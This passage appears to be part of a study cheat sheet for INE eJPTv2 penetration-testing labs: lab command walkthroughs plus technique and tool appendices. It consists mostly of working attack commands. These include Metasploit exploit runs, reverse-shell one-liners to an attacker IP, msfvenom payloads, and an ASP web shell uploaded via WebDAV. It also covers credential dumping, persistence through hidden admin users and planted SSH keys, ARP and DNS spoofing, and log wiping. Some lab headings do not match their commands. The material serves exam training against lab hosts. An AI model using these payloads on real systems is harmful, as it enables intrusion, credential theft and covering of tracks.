use exploit/windows/misc/hta_server
exploit
“http://10.10.31.2:8080/Rv4eiCTge85UJ15.hta” and run it on cmd.exe with

mshta.exe http://10.10.31.2:8080/Rv4eiCTge85UJ15.hta

sessions -i 1
cd C:\\Users\\Administrator\\Desktop
cat flag.txt
```

## 34. Windows PrivescCheck

```bash
ping -c4 target.ine.local

find / -not -type l -perm -o+w

ls -l /etc/shadow
cat /etc/shadow

vim /etc/shadow

cd /root
ls -l
cat flag
```

## 35. Linux Privilege Escalation (Permissions Matter)

```bash
ping -c 4 target.ine.local

find / -user root -perm -4000 -exec ls -ldb {} \;

sudo -l

sudo man ls

!/bin/bash

cd /root
ls -l
cat flag
```

## 36. Linux Privesc: Editing Gone Wrong

```bash
nmap demo.ine.local

nmap -sV -p 80 demo.ine.local

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit

getuid

background
use exploit/windows/local/persistence_service
set SESSION 1
exploit

msfconsole -q
use exploit/multi/handler
set LHOST <Attacker Kali Machine IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
exploit

exploit
```

## 37. Maintaining Access: Persistence Service (Windows)

```bash
ping -c 4 demo.ine.local

nmap demo.ine.local

nmap -sV -p 80 demo.ine.local

msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit

getuid

ps -S explorer.exe
migrate 2764
-   Enable RDP service if it’s disabled
-   Creates new user for an attacker
-   Hide user from Windows Login screen
-   Adding created user to "Remote Desktop Users" and "Administrators"

run getgui -e -u alice -p hack_123321

xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local
```

## 38. Maintaining Access: RDP (GetGui)

```bash
ping -c 4 demo.ine.local

nmap demo.ine.local
SSH port is open.

ssh student@demo.ine.local

ls -al

scp student@demo.ine.local:~/.ssh/id_rsa .

ssh student@demo.ine.local

chmod 400 id_rsa
ssh -i id_rsa student@demo.ine.local

ls -l
cat flag.txt
```

## 39. Linux Persistence

```bash
ping -c 4 demo.ine.local

nmap demo.ine.local
SSH port is open.

ssh student@demo.ine.local

ps -eaf

echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
crontab -i cron
crontab -l

ssh student@demo.ine.local

nmap -p- demo.ine.local

curl demo.ine.local:8000
curl demo.ine.local:8000/flag.txt
```

## 40. Dumping & Cracking: Windows NTLM Hash Cracking

```bash
ping -c 4 demo.ine.local

nmap demo.ine.local

nmap -sV -p 80 demo.ine.local

/etc/init.d/postgresql start
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit

migrate -N lsass.exe

hashdump

background

use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

## 41. Password Cracker: Windows / Linux

```bash
ping -c 4 demo.ine.local

nmap -sS -sV demo.ine.local

nmap --script vuln -p 21 demo.ine.local

/etc/init.d/postgresql start

msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z

use post/linux/gather/hashdump
set SESSION 1
exploit

use auxiliary/analyze/crack_linux
set SHA512 true
run
```

## 42. Proftpd Backdoored / Pivoting

```bash
ping -c 4 demo1.ine.local
ping -c 4 demo2.ine.local

nmap demo1.ine.local

nmap -sV -p80 demo1.ine.local

msfconsole -q

use exploit/windows/http/rejetto_hfs_exec

set RHOSTS demo1.ine.local

exploit

ipconfig

run autoroute -s 10.0.19.0/20

background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit

sessions -i 1
portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>

nmap -sV -sS -p 1234 localhost

background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit

shell
cd /
type flag.txt

ping -c 4 demo.ine.local

nmap -sV demo.ine.local

msfconsole

use exploit/windows/http/badblue_passthru

set RHOSTS demo.ine.local

exploit

clearev

nmap -sV -p 445 demo.ine.local

cat /dev/null > ~/.bash_history
```

## 43. Let's Go Phishing

_GUI / tool-interface lab (Burp Suite, phishing console, etc.) — refer to the original document's screenshots; no standalone shell commands were captured._

## 44. Web App Enumeration with CURL

```bash
dirb http://demo.ine.local

curl -X GET demo.ine.local

curl -I demo.ine.local

curl -X OPTIONS demo.ine.local -v

curl -X POST demo.ine.local

curl -XPUT demo.ine.local

curl -X OPTIONS demo.ine.local/login.php -v

curl -X POST demo.ine.local/login.php

curl -X POST demo.ine.local/login.php -d "name=john&password=password"
-v

curl -X OPTIONS demo.ine.local/post.php -v

curl -X OPTIONS demo.ine.local/uploads/
curl -X OPTIONS demo.ine.local/uploads/ -v
file upload via the PUT method.

echo "Hello World" > hello.txt
curl demo.ine.local/uploads/ --upload-file hello.txt

curl -XDELETE demo.ine.local/uploads/hello.txt
```

## 45. Web App Interaction with Burp Suite

_GUI / tool-interface lab (Burp Suite, phishing console, etc.) — refer to the original document's screenshots; no standalone shell commands were captured._

## 46. Scanning Web Application with Nikto

```bash
nmap demo.ine.local

nikto

nikto -Help

nikto -h demo.ine.local
-   Target server: Apache version 2.4.7
-   Backend: PHP version 5.5.9 built on Ubuntu

nikto -h
http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php
-Tuning 5 -Display V

nikto -h
http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php
-Tuning 5 -o nikto.html -Format htm

ls -l
URL: file:///root/nikto.html
```

## 47. Passive Crawling with Burp Suite / Gobuster

```bash
ping -c 4 demo.ine.local

nmap -sS -sV demo.ine.local

firefox http://demo.ine.local

nmap demo.ine.local

gobuster

gobuster dir --help

gobuster dir -u http://demo.ine.local -w
/usr/share/wordlists/dirb/common.txt

gobuster dir -u http://demo.ine.local -w
/usr/share/wordlists/dirb/common.txt -b 403,404

gobuster dir -u http://demo.ine.local -w
/usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r

gobuster dir -u http://demo.ine.local/data -w
/usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
```

## 48. Exploiting WordPress (WPScan)

```bash
ping -c3 demo.ine.local

nmap -sS -sV demo.ine.local

nc -lvp 54321

ls

find / -iname *flag* 2>/dev/null
The output reveals the flag file: /var/www/html/91b2f916340-FLAG

cat /var/www/html/91b2f916340-FLAG
```

---

## Quick Tool Index

| Phase | Tools used across these labs |
|-------|------------------------------|
| Host discovery / scanning | `ping`, `nmap` (`-Pn`, `-sV`, `-p-`, `-sU`, NSE scripts), `curl` |
| Exploitation framework | `msfconsole` — Metasploit modules, `meterpreter`, `autoroute`, pivoting |
| Web enumeration | `dirb`, `gobuster`, `nikto`, `wpscan`, Burp Suite, `curl` |
| SMB / NetBIOS | `smbclient`, `nmblookup`, `rpcclient`, `enum4linux`, SMB NSE scripts |
| Shells / file transfer | `nc` (Netcat), `python3 -m http.server`, `certutil`, `wget` |
| Post-exploitation | meterpreter post modules, JAWS, PrivescCheck, Mimikatz/Kiwi |
| Cracking | John the Ripper / hashcat (NTLM, Linux shadow hashes) |

> Auto-summarized from `EJPTV2_2026_ALL_LABS.docx`. Narrative explanations, screenshots,
> flags, and per-lab notes from the original are condensed or omitted — keep the full
> document for complete context. A few labs are GUI-driven and have no captured CLI commands.

---

# APPENDIX A — Technique Cross-Reference

Same content as Labs 1–48 but indexed by attack technique. Use this when you know *what* you want to do and need to find the right commands fast.

## A.1 Reconnaissance & Scanning

```bash
# Host discovery
nmap -sn 10.0.0.0/24                                # ping sweep
nmap -Pn demo.ine.local                              # force scan if ICMP blocked

# Full TCP port scan
nmap -sS -p- --min-rate 1000 demo.ine.local

# Service versions
nmap -sV -sC demo.ine.local
nmap -sV -O -p <ports> demo.ine.local

# UDP
nmap -sU --top-ports 100 demo.ine.local

# Banner grabbing
nc <target> 22
nmap -sV --script=banner <target>

# NSE
nmap --script http-enum -sV -p 80 <target>
nmap -p445 --script "smb-*" <target>
nmap -sU -p 161 --script "snmp-*" <target>
nmap --script vuln <target>
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <target>
```

## A.2 SMB / Samba (Labs 11, 24, 31, 32, 33)

```bash
# Enumeration
nmap -sV -p 139,445 <target>
nmap -p445 --script smb-protocols <target>
nmap -p445 --script smb-os-discovery.nse <target>
nmap -p445 --script smb-enum-users.nse <target>

smbclient -L //<target> -N
enum4linux -a <target>

# rpcclient (finds hidden shares)
rpcclient -U "" -N <target>
# inside: srvinfo / enumdomusers / netshareenumall / exit

# Brute hidden shares
while read share; do
  result=$(smbclient //<target>/"$share" -N -c 'ls' 2>&1 | head -3)
  if ! echo "$result" | grep -q "BAD_NETWORK_NAME"; then
    echo "=== $share ==="; echo "$result"
  fi
done < /root/Desktop/wordlists/shares.txt

# Brute users/passwords (USE THIS, not hydra)
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# Exploits
use exploit/windows/smb/psexec                       # with admin creds
use exploit/multi/samba/usermap_script               # Samba 3.0.20 — instant root
use exploit/linux/samba/is_known_pipename            # Samba 3.5–4.6.4 (SambaCry)
```

## A.3 HTTP / Web (Labs 5, 6, 15, 16, 44–48)

```bash
# Manual
curl -I http://<target>/
curl -X OPTIONS http://<target>/ -v
curl -X PUT http://<target>/file -d "data"
curl -X DELETE http://<target>/file

# Dir brute
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
dirb http://<target>
ffuf -u http://<target>/FUZZ -w wordlist.txt -fc 404

# Nikto
nikto -h <target>
nikto -h http://<target>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm

# WordPress
wpscan --url http://<target>
wpscan --url http://<target> --enumerate u,t,p

# MSF Apache modules (Lab 15) — 10 modules chain
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/apache_userdir_enum

# WebDAV (Lab 6)
davtest -auth bob:password_123321 -url http://<target>/webdav
use exploit/windows/iis/iis_webdav_upload_asp

# Manual WebDAV when MSF or stock shells fail — custom ASP
cat > /tmp/shell.asp << 'EOF'
<%
sCmd = Request.QueryString("cmd")
If sCmd <> "" Then
  Set oShell = Server.CreateObject("WScript.Shell")
  Set oExec = oShell.Exec("cmd.exe /c " & sCmd)
  Response.Write "<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll()) & "</pre>"
End If
%>
<form method="GET"><input name="cmd" size="80"><input type="submit" value="Run"></form>
EOF
curl -u user:pass -T /tmp/shell.asp http://<target>/webdav/shell.asp
curl -u user:pass -G --data-urlencode "cmd=type C:\flag.txt" http://<target>/webdav/shell.asp
```

## A.4 Specific Service Exploits

```bash
# Rejetto HFS 2.3 (Labs 9, 10, 25, 36, 42)
use exploit/windows/http/rejetto_hfs_exec

# BadBlue 2.7 (Labs 11, 37, 40, 42)
use exploit/windows/http/badblue_passthru

# Shellshock (Labs 5, 29)
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set TARGETURI /gettime.cgi

# vsftpd 2.3.4 backdoor (Labs 23, 26)
use exploit/unix/ftp/vsftpd_234_backdoor

# ProFTPd 1.3.3c backdoor (Lab 41)
use exploit/unix/ftp/proftpd_133c_backdoor

# Samba usermap_script (Lab 24)
use exploit/multi/samba/usermap_script

# Samba is_known_pipename / SambaCry (Labs 31, 32, 33)
use exploit/linux/samba/is_known_pipename

# XODA file upload (Labs 2, 3, 14)
use exploit/unix/webapp/xoda_file_upload

# libssh auth bypass CVE-2018-10933 (Lab 17)
use auxiliary/scanner/ssh/libssh_auth_bypass
set SPAWN_PTY true
```

## A.5 Shells, Listeners, File Transfer

```bash
# Host files on Kali
python -m SimpleHTTPServer 80                        # Python 2
python3 -m http.server 80                            # Python 3

# Download on Windows
certutil -urlcache -f http://<Kali_IP>/file file
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<Kali>/f','f')"

# Download on Linux
wget http://<Kali_IP>/file
curl -O http://<Kali_IP>/file

# Bind shell
nc.exe -nvlp 1234 -e cmd.exe                         # Windows target
nc -nv <target> 1234                                  # Kali connect

# Reverse shell
nc -nvlp 1234                                         # Kali listener
nc.exe -nv <Kali_IP> 1234 -e cmd.exe                  # Windows
nc <Kali_IP> 1234 -e /bin/bash                        # Linux

# One-liners
bash -i >& /dev/tcp/<Kali_IP>/1234 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<Kali>",1234));[os.dup2(s.fileno(),i) for i in (0,1,2)];import pty;pty.spawn("/bin/bash")'

# Upgrade dumb shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z ; stty raw -echo; fg ; Enter twice

# msfvenom payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > b.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f asp -o s.asp
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o s.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o s.php

# Handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>; set LPORT 4444
exploit -j
```

## A.6 Post-Exploitation & Privesc

### Meterpreter basics
```bash
getuid ; sysinfo ; getsystem ; hashdump
ps ; ps -S explorer.exe ; migrate <PID>
shell ; search -f flag.txt
```

### Windows enumeration (Lab 25)
```bash
systeminfo ; whoami /priv /groups ; hostname
net user ; net localgroup administrators ; net view
ipconfig /all ; route print ; arp -a ; netstat -ano
tasklist /SVC ; schtasks /query /fo LIST

# MSF post modules
use post/windows/gather/enum_logged_on_users
use post/windows/gather/win_privs
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches

# JAWS PowerShell auto-enum
upload /root/Desktop/jaws-enum.ps1
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
download JAWS-Enum.txt
```

### Linux enumeration (Labs 26-30)
```bash
# Manual
uname -a ; cat /etc/issue ; cat /etc/*-release
id ; whoami ; sudo -l                                # check GTFOBins!
cat /etc/passwd ; cat /etc/shadow
ifconfig / ip a ; route ; cat /etc/networks /etc/hosts /etc/resolv.conf
ps ; ls -al /etc/cron*

# Find weak permissions
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -not -type l -perm -o+w 2>/dev/null
getcap -r / 2>/dev/null

# MSF post modules (Lab 29)
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system

# Automated
./LinEnum.sh
./linpeas.sh
```

### Windows privesc (Labs 8, 10, 34, 37, 38, 40)
```bash
getsystem                                            # try first

# Token impersonation
load incognito
list_tokens -u
impersonate_token DOMAIN\Administrator

# UAC bypass with UACMe
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

# Unattend.xml + base64 decode
cat C:\Windows\Panther\Unattend.xml
$password='QWRtaW5AMTIz'
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
runas.exe /user:administrator cmd

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# HTA payload delivery (for the runas-elevated context)
# On Kali: use exploit/windows/misc/hta_server ; exploit
# On target: mshta.exe http://<kali>:8080/<random>.hta

# Persistence
run persistence -X -i 30 -p 4444 -r <ip>
use exploit/windows/local/persistence_service
run getgui -e -u alice -p hack_123321                # enable RDP + create user

# Credential dumping (Lab 11, 40)
migrate -N lsass.exe
load kiwi
creds_all ; lsa_dump_sam ; lsa_dump_secrets
hashdump
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### Linux privesc (Labs 35, 36)
```bash
# World-writable /etc/shadow (Lab 34/35 in the source)
find / -not -type l -perm -o+w 2>/dev/null
openssl passwd -1 -salt abc password                # generate hash
vim /etc/shadow                                      # paste hash in root's record
su                                                   # password: password

# sudo escape via GTFOBins (Lab 36)
sudo -l
sudo man ls
!/bin/bash                                          # pager escape → root

# Common sudo escapes:
# sudo vim → :!/bin/bash
# sudo find / -exec /bin/bash \; -quit
# sudo less /etc/hosts → !/bin/bash
# sudo awk 'BEGIN {system("/bin/bash")}'
```

### Linux persistence (Lab 39)
```bash
# SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# crontab
echo "* * * * * cd /home/user && python -m SimpleHTTPServer" > cron
crontab -i cron
crontab -l

# Or pull existing key
scp user@target:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa user@target
```

### Password cracking (Labs 40, 41)
```bash
hashid '<hash>'

# Hashcat modes: 0=MD5 100=SHA1 1000=NTLM 1400=SHA256 1800=sha512crypt 5600=NetNTLMv2 3200=bcrypt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm.txt rockyou.txt --potfile-disable

# John
john --format=NT ntlm.txt --wordlist=rockyou.txt
unshadow /etc/passwd /etc/shadow > c.txt
john c.txt --wordlist=rockyou.txt

# Format converters
ssh2john id_rsa > rsa.hash
zip2john f.zip > zip.hash

# MSF analyze modules
use auxiliary/analyze/crack_windows
use auxiliary/analyze/crack_linux
set SHA512 true
```

## A.7 Pivoting (Labs 2, 3, 11, 14, 42)

```bash
# Autoroute (preferred — stable)
shell
ip addr                                              # find 2nd interface
run autoroute -s 192.180.108.0/24

# Or via module
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.180.108.0
run

# Scan pivoted network (auto-routes through session)
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set PORTS 1-1000
exploit

# SOCKS proxy + proxychains (for external tools)
use auxiliary/server/socks_proxy
set SRVPORT 9050 ; set VERSION 4a
exploit -j
# /etc/proxychains4.conf: socks4 127.0.0.1 9050
proxychains nmap -sT -Pn -sV -p 445 demo1.ine.local

# Port forwarding (single port)
portfwd add -l 1234 -p 80 -r <2nd_target_ip>

# Pivot to SMB shares
sessions -i 1 ; shell
net view 10.0.28.125
migrate -N explorer.exe
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
cat D:\FLAG2.txt

# Static binary scanner on pivot host (no nmap installed)
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
chmod +x /tmp/nmap /tmp/bash-port-scanner.sh
./bash-port-scanner.sh <target>
./nmap -p- <target>

# SSH pivoting alternatives
ssh -D 1080 -f -N user@pivot                         # dynamic SOCKS
ssh -L 8080:<2nd_target>:80 user@pivot               # local forward
ssh -R 4444:localhost:4444 user@pivot                # remote forward
```

## A.8 Network Attacks (Lab 13)

```bash
# SMB Relay
use exploit/windows/smb/smb_relay
set SRVHOST <kali_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <kali_ip>
set SMBHOST <client_to_relay_against>

# ARP spoof (enable IP forwarding first)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t <victim> <gateway>
arpspoof -i eth1 -t <gateway> <victim>

# DNS spoof
echo "<kali_ip> *.target.com" > dns
dnsspoof -i eth1 -f dns

# Responder (LLMNR/NBT-NS)
sudo responder -I eth0 -A

# Bettercap (modern)
sudo bettercap -iface eth0
# net.probe on ; set arp.spoof.targets <victim> ; arp.spoof on ; net.sniff on
```

---

# APPENDIX B — Tool Reference

| Tool | Purpose | Labs |
|---|---|---|
| nmap | Port/service scanning, NSE | nearly all |
| Metasploit (msfconsole) | Exploit framework | nearly all |
| enum4linux / enum4linux-ng | SMB enumeration | 11, 24 |
| smbclient | SMB share access | 11, 24 |
| rpcclient | RPC over SMB (netshareenumall = hidden shares) | 11 |
| smbmap | SMB permissions | 11 |
| nmblookup | NetBIOS lookup | 11 |
| hydra | Online brute force (NOT SMBv2+) | 7, 11, 12, 23 |
| snmpwalk | SNMP enumeration | 12 |
| netcat (nc/nc.exe) | Banner grab, shells, transfer | 19, 21–23, 48 |
| telnet | Manual SMTP/HTTP | 16, 17 |
| smtp-user-enum | SMTP user enum | 16 |
| sendemail | Send mail CLI | 16 |
| curl / wget | HTTP fetch / upload | 14, 15, 32, 44 |
| gobuster / dirb / ffuf | Directory brute | 44, 47 |
| nikto | Web vuln scan | 46 |
| wpscan | WordPress audit | 48 |
| whatweb | CMS fingerprint | 47 |
| davtest | WebDAV ext enum | 6 |
| cadaver | WebDAV client | 6 |
| searchsploit | Local Exploit-DB | 21 |
| msfvenom | Payload generation | 9, 21 |
| python -m SimpleHTTPServer / http.server | File hosting | 21, 22, 23, 31, 32 |
| certutil | Windows file download | 22, 23, 31 |
| evil-winrm | Modern WinRM client | 8, 9 |
| xfreerdp | RDP client | 7, 38 |
| proxychains | Tunnel through SOCKS | 11 |
| arpspoof / dnsspoof | L2/DNS MitM | 13 |
| Responder | LLMNR/NBT-NS poison | (network attacks) |
| LinEnum / LinPEAS | Linux auto-enum | 29 |
| PrivescCheck.ps1 | Windows auto-enum | 33, 34 |
| PowerUp.ps1 (PowerSploit) | Windows auto-enum | 10 |
| UACMe (Akagi64.exe) | UAC bypass | 8 |
| JAWS | Windows enum PowerShell | 25 |
| mimikatz / kiwi | Credential dump | 11, 40 |
| john / hashcat | Offline crack | 40, 41 |
| hashid | Hash identification | 40, 41 |
| ssh2john / zip2john / pdf2john | Format converters | 41 |
| openssl passwd | Generate Unix password hash | 34 |
| GTFOBins (web) | Sudo/SUID escape lookup | 35, 36 |
| ssh / scp | Remote shell + transfer | 38, 39 |
| ftp | FTP client | 23 |
| ifconfig / ip | Network interfaces | many |
| ping | Reachability | most |
| vim / nano | Text editing | 21, 34 |
| firefox / browser | Web GUI | 45, 47 |
| Burp Suite | Web proxy | 45, 47 |
| mshta.exe | HTA payload delivery (Windows) | 10, 33 |
| runas.exe | Run as different user (Windows) | 10, 33 |

---

**End of Master Reference.**

This document consolidates **48 INE eJPTv2 labs** plus a complete technique cross-reference and tool index into one searchable file. Use Part 0 + Appendix A for fast lookup during the exam; use the numbered labs as full walkthroughs while practicing.
